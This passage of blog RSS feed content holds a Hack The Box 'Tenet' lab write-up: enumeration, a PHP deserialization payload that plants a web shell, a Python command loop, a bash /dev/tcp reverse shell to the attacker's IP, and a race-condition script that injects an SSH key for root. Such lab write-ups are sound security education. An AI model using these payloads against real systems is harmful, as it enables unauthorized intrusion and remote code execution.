+key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&amp;#34;&lt;/span&gt;
+addKey
+checkAdded
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The script is fairly simple in nature. First, it creates a temp file in &lt;code&gt;/tmp&lt;/code&gt; and then it echos the root public root SSH key. Then it adds that file to the &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt; file and checks to make sure the key was added successfully.&lt;/p&gt;
+&lt;p&gt;This creates a race conidion. If that file is overwritten by a diffrent SSH key before it is added to &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt;, it would grant SSH access as the root user.&lt;/p&gt;
+&lt;p&gt;A simple bash can be used to check to check if the temp file has been created. If it has, it will be overwritten with a key key of our choosing. Place all this in a while loop and start it running.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; true; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Checking for temp file...&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt; ls /tmp/ssh-* 2&amp;gt;/dev/null &lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+                echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6+U/U+EtFlAU/0QuXeMehQgipru8HqD+TOoGMoM8pON+Brgvr0ThHzSq14wSC6F8yZsHbHYgb7gVutcNsADD+mkl+aZn97385WgWxwYZdW6a8VRLCRFr9nLZhwGeBEJC33+GbKyn3P5flagzgdTlhSBeNxuIh1ahxhnunpEQO7x+J8vyP1ZzYbU2ukApurzkMbV3osD7ovKIKxHc9zbPLOT/907tpz0bT4K3PLsh2FTNjK7xhTNWbqO975+x0d/Ni3UIcmyEb6APTz2ipxqWELpw041Fj6uxzq9pRWLuMypV9vCP9smybu22yEClb4t4J3r63qFl+hpzEwcO8JS7gdhUI9oB7VxyrcjLM4/5MPCnW0faulAUnpspWMsaqun2OjJ1tQMtVJKT3WkUT/We6CPx6YigxnQgV6nUHW3qZ3ZCgvHRot8IRpCYA/fImMcWhuseX5dWGHOJtL641h43xI8AZPQylNkPepCzEa5vQ/b+tKaG7cWxjVD4jbgg4ZRk= root@ubuntu&amp;#34;&lt;/span&gt; &amp;gt; /tmp/ssh-*
+                echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;File found and overwritten&amp;#34;&lt;/span&gt;
+                exit
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;File not found. Continuing.&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;EnableSSH.sh&lt;/code&gt; can then be run from another session. The Overwrite script reports it found and overwrote a file and &lt;code&gt;EnableSSH.sh&lt;/code&gt; tells us the key was added successfully.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-fileoverwritten.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;The private key matching the public key used in the script can then be used to SSH to Tenet with root permissions.&lt;/p&gt;
+&lt;h2 id=&#34;wrap-up&#34;&gt;Wrap Up&lt;/h2&gt;
+&lt;p&gt;Thanks &lt;a href=&#34;https://app.hackthebox.eu/users/94858&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;egotisticalSW&lt;/a&gt;
+ for making this machine! I overall had a ton of fun. There was some difficulty on the root privesc. It took two days of attempting to finally get it working and switching to VIP+ servers. I think the challenge was I kept running into other people working on it at the same time and our scripts were clashing. I could see that getting very frustrating.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>HTB Tenet</title>
+      <link>http://nightwolf56.github.io/posts/tenet-writeup/</link>
+      <pubDate>Tue, 22 Jun 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://nightwolf56.github.io/posts/tenet-writeup/</guid>
+      <description>&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-logo.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Tenet starts off with a wordpress site. After some enumeration second domain is found and a PHP file vulnerable to object injection. From there, an attacker can get a shell, find credentials in a configuration file, and privesc to root by leveraging a race condition.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;NMAP shows port 22 is open for SSH and port 80 is running an HTTP server displaying the default apache2 page.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-01-17 00:47 UTC
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.223
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 14.61 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The default page doesn&amp;rsquo;t give us a whole lot of info and there doesn&amp;rsquo;t seem to be a robots.txt. FFUF or another directory brute forcer  can be used to learn there is a wordpress directory.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ffuf -u http://10.10.10.223/FUZZ -w /opt/dirbuster-wordlists/directory-list-2.3-medium.txt
+
+        /&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;___\  /&amp;#39;&lt;/span&gt;___&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;          /&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;___&lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;       /&lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_&lt;/span&gt;_/ /&lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_&lt;/span&gt;_/  __  __  /&lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_&lt;/span&gt;_/
+       &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \ &lt;/span&gt;,__&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;,__&lt;span style=&#34;color:#ae81ff&#34;&gt;\/\ \/\ \ \ \ &lt;/span&gt;,__&lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \ \_&lt;/span&gt;/ &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \ \_&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;\ \ \_\ \ \ \ \_&lt;/span&gt;/
+         &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_\ &lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_\ &lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_&lt;/span&gt;___/  &lt;span style=&#34;color:#ae81ff&#34;&gt;\ \_\
+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;          &lt;span style=&#34;color:#ae81ff&#34;&gt;\/&lt;/span&gt;_/    &lt;span style=&#34;color:#ae81ff&#34;&gt;\/&lt;/span&gt;_/   &lt;span style=&#34;color:#ae81ff&#34;&gt;\/&lt;/span&gt;___/    &lt;span style=&#34;color:#ae81ff&#34;&gt;\/&lt;/span&gt;_/
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.223/FUZZ
+ :: Wordlist         : FUZZ: /opt/dirbuster-wordlists/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+ :: Threads          : &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+                        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;                       &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 1688, Words: 186, Lines: 43&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+wordpress               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 316, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+                        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+server-status           &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 403, Size: 277, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+:: Progress: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;220547/220547&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; :: Job &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1/1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; :: &lt;span style=&#34;color:#ae81ff&#34;&gt;276&lt;/span&gt; req/sec :: Duration: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0:13:17&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; :: Errors: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Adding &lt;code&gt;tenet.htb&lt;/code&gt; to  &lt;code&gt;/etc/hosts&lt;/code&gt; will make it function better. Wordpress tends to want to redirect to a domain. There are a few articles talking about their newly coming services and mention of a site migration. On one post, there is a comment that references a &amp;ldquo;sator.php&amp;rdquo; file and a backup version of it. Seemingly, the site migration is incomplete.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-migrationcomment.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Sator dosent&#39; exist on this site this site. However,  box might have multiple virtual hosts. That turns out to be the case. After &lt;code&gt;sator.tenet.htb&lt;/code&gt; is added &lt;code&gt;/etc/hosts&lt;/code&gt; a copy of the wordpress site seen found prior is accessible  On this one, &lt;code&gt;sator.php&lt;/code&gt; is present and more importantly, the aforementioned backup version of it, &lt;code&gt;sator.php.bak&lt;/code&gt; is also accessible.&lt;/p&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-statorphpbak.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sator.php&lt;/code&gt; takes input through the &lt;code&gt;arepo&lt;/code&gt; parameter. That output is then deserialized. There is also a class that is called DatabaseExport that writes to a file Deseralizaiton can lead to some unintended results through object injection.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;__destruct ()&lt;/code&gt; function means PHP file can be leveraged to create object and from it a file. To  pull this off, write a PHP file that mirrors sator.php but a bit different.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DatabaseExport&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $user_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;users.txt&amp;#39;&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;update_db&lt;/span&gt;()
+    {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Grabbing users from text file &amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;;
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sucess&amp;#39;&lt;/span&gt;;
+    }
+
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct()
+    {
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;user_file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;magic.php&amp;#39;&lt;/span&gt;;
+        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;?php system(&amp;#34;whoami&amp;#34;); ?&amp;gt;&amp;#39;&lt;/span&gt;;
+
+    }
+}
+
+$app &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DatabaseExport&lt;/span&gt;();
+&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($app);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Instead of a &lt;code&gt;__destruct&lt;/code&gt; a is used &lt;code&gt;__construct&lt;/code&gt; and a few other items are changed as well. The output file is going to be called &lt;code&gt;magic.php&lt;/code&gt; and the contents will be some simple PHP code to execute the &lt;code&gt;whomami&lt;/code&gt; command.&lt;/p&gt;
+&lt;p&gt;Running the above file using &lt;code&gt;php file&lt;/code&gt; and outputs the following.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;O&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DatabaseExport&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:{&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_file&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;magic.php&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php system(&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;whoami&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;); ?&amp;gt;&amp;#34;&lt;/span&gt;;}&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This can be sent to the server using the &lt;code&gt;arepo&lt;/code&gt; argument. Then a request can be made to &lt;code&gt;10.10.10.223/magic.php&lt;/code&gt;. The response is &lt;code&gt;www-data&lt;/code&gt;, showing code execution.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;If you are interested in learning more about PHP deserialization attacks, IppSec has some awesome videos I referenced while working on this. &lt;a href=&#34;https://youtu.be/JpzREo7XLOY?t=4174&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Player 2 PHP deserialization to place an SSH key.&lt;/a&gt;
+ and &lt;a href=&#34;https://www.youtube.com/watch?v=HaW15aMzBUM&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Intro to PHP deserialization&lt;/a&gt;
+&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;This is a bit clumsy though and there are some ways it can be nicened up.&lt;/p&gt;
+&lt;p&gt;First  &lt;code&gt;whoami&lt;/code&gt; can be changed to instead take the  argument &lt;code&gt;c&lt;/code&gt; from a get request and execute using the system function.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shell_exec&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;]); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That can be created on the Tenet with following.
+&lt;code&gt;http://sator.tenet.htb/sator.php?arepo=O:14:&amp;quot;DatabaseExport&amp;quot;:2:{s:9:&amp;quot;user_file&amp;quot;;s:9:&amp;quot;magic.php&amp;quot;;s:4:&amp;quot;data&amp;quot;;s:37:&amp;quot;&amp;lt;?php echo shell_exec($_GET[&amp;quot;c&amp;quot;]); ?&amp;gt;&amp;quot;;}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This is very workable and requests can be  sent  with curl, burp, postman, or even just a web browser. But console applications are cool.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; readline
+
+URI &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Path to PHP shell. (http://example.site/file.php)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sending commands to: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; URI)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
+	command &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;#34;&lt;/span&gt;)
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; command &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;:
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+		r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(URI&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?c=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; command)
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s fairly simple in nature but it does give a way to send and receive commands a terminal like interface. Now that that is ready to go, it&amp;rsquo;s time to get a proper reverse shell.&lt;/p&gt;
+&lt;p&gt;The old fallback of &lt;code&gt;basn -c &#39;bash -i &amp;gt;&amp;amp;/dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt; fails along with a similar one using netcat &lt;code&gt;nc -e /bin/sh &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;. There is more than one way to send this payload though.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+basn -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bash -i &amp;gt;&amp;amp;/dev/tcp/10.10.14.36/5678 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This file is created and saved, a python HTTP server is started in the same directory, and a netcat listener on port 5678. Then we go back to back to our &amp;ldquo;terminal&amp;rdquo; access for Tenet, wget the file, mark it as executable and run it. Right away the netcat listener get&amp;rsquo;s a connection.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/tenet-properreverseshellsteps.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user&#34;&gt;User&lt;/h2&gt;
